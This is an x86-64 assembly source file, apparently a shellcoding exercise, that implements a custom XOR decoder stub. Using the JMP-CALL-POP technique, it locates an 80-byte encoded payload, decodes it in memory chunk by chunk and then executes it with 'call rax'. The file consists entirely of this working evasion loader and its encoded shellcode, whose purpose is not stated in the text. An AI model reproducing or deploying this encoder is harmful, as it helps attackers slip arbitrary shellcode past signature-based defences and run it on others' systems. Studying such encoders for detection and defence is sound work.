; Author: Robert C. Raducioiu

global _start

section .text

_start:

    ; clear RCX
    xor ecx, ecx

    jmp short CallShellcode

Shellcode:

    ; get the address of the encoded shellcode using
    ; the JMP-CALL-POP technique
    pop rsi
    
    ; statically set the size of the shellcode
    add cl, 80

    ; save the base address of the shellcode in RDX
    push rsi
    pop rdx

    ; push to the stack for later use
    push rdx

    ; skip the next routine
    jmp short LoopDecodeSkip

LoopDecode:

    ; increase registers to step to the next chunk
    add esi, 8
    add edx, 7

LoopDecodeSkip:

    ; clear RAX
    xor eax, eax

    ; get the XOR byte of the chunk and XOR it
    ; with the XOR byte generated initially
    mov bl, BYTE [rsi]
    xor bl, 0xa9

CopyDecodedByte:

    ; step to the next encoded byte
    add al, 1

    ; decode the encoded byte
    mov bh, BYTE [rsi + rax]
    xor bh, bl

    ; replace the encoded byte with the decoded one
    mov BYTE [rdx + rax], bh

    ; if RAX is 7 it means we decoded 7 bytes
    ; it's time to go to the next chunk
    cmp al, 7
    jz LoopDecode

    ; if RCX != 0 then go back to decoding
    loop CopyDecodedByte

RunShellcode:

    ; skip the first byte (XOR byte)
    pop rax
    add al, 1

    ; run the decoded shellcode
    call rax

CallShellcode:

    call Shellcode
    encoded: db 0x83,0x1b,0xe3,0x62,0xdd,0xcb,0x62,0xa3,0x69,0x94,0xe4,0x38,0x88,0x43,0x2c,0xc8,0x5a,0xa7,0xa9,0xbb,0x4d,0xa8,0xf2,0xf8,0x53,0xe6,0xa1,0xb6,0xeb,0xe0,0xb2,0x41,0x6b,0xb6,0xa1,0xa0,0xb0,0xb6,0xa1,0xa0,0x51,0x8a,0xb0,0xc9,0x26,0xae,0xac,0xa7,0x38,0xc0,0xd9,0x18,0xed,0xb5,0x69,0xd9,0xfd,0xd7,0xb8,0x5c,0x1c,0xd9,0x60,0x70,0xc5,0xef,0xac,0x50,0x24,0x93,0xa4,0x63,0xa8,0x4,0xa8,0xa8,0xa8,0xa8,0xa8,0xa8
